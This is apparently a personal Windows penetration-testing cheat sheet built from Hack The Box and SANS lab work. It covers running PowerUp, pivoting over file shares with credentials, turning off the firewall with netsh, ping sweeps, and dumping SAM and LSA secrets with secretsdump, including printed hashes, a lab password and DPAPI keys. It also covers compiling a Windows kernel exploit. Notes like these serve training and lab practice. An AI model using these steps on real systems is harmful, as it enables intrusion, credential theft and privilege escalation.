Windows

# Windows

Run PS script with a cmd.exe shell
```shell
type PowerUp.ps1 | powershell.exe -noprofile -
```

## File share

If you can't `net use` a shared folder, enable File and Printer via RDP, reboot if necessary. If you encounter error `A specified logon session does not exist.`, do [this](https://superuser.com/questions/968879/windows-10-map-network-drive-a-specified-logon-session-does-not-exist/1126123#1126123)

Use `rmdir` to delete recursively on Windows

```shell
C:\Tmp>rmdir SSFWin32\SSF-Win32 /s /q
rmdir SSFWin32\SSF-Win32 /s /q
```

## Powershell

Check for [PS history file ](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html) at
`C:\Users\sansforensics408\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>`

### Robocopy syntax

```shell
C:\Temp\SSFWin32>robocopy \\172.16.10.5\lab9 C:\Temp\SSFWin32 /e
```
If need to pivot from Windows, and have problems with existing accounts, create account and net use with creds

```shell
net use \\10.100.11.101\pivot /user:admin Password1
```

## Security mitigation

Disable FW if possible with `C:\Temp>netsh advfirewall set allprofiles state off`. Check status of FW with `C:\Temp>netsh advfirewall show allprofiles state`

## Enumeration

```shell
C:\Temp>Fping.exe -g 172.30.111.1/172.30.111.254
Fping.exe -g 172.30.111.1/172.30.111.254

Fast pinger version 3.00
(c) Wouter Dhondt (http://www.kwakkelflap.com)
```

## Update patches

Downloaded Windows update patches are stored in **C:\Windows\SoftwareDistribution\Download** but not necessarily installed; handy way of checking if a system is unpatched.

## Pillaging

### Credentials dumping 

If you somehow have access to **SAM**, **SYSTEM** and **SECURITY** in `C:\Windows\System32\config`, use Impacket's **secretsdump.py**

```shell
root@Kali:~/HTB/Bastion# secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:e4487d0421e6611a364a5028467e053c:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... 
```

## Kernel exploits 

### Compilation

If you need to compile a kernel exploit, note that some C code has Microsoft implementation that won't work with normal mingw cross-compilation ie. `root@Kali:~/HTB/Optimum# x86_64-w64-mingw32-gcc 41015.c -o 41015.exe`

Instead, compile it with **Developer Command Prompt for Visual Studio** (type into Start)
```
D:\HTB\Optimum>cl 41015.c /link /out:41015_new2.exe
Microsoft (R) C/C++ Optimizing Compiler Version 19.10.25027 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

41015.c
Microsoft (R) Incremental Linker Version 14.10.25027.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:41015.exe
/out:41015_new2.exe
41015.obj

D:\HTB\Optimum>dir 41015_new2.exe
 Volume in drive D is OS
 Volume Serial Number is 0EE7-D347

 Directory of D:\HTB\Optimum

19/04/2020  21:16           123,904 41015_new2.exe
               1 File(s)        123,904 bytes
               0 Dir(s)  589,864,071,168 bytes free
```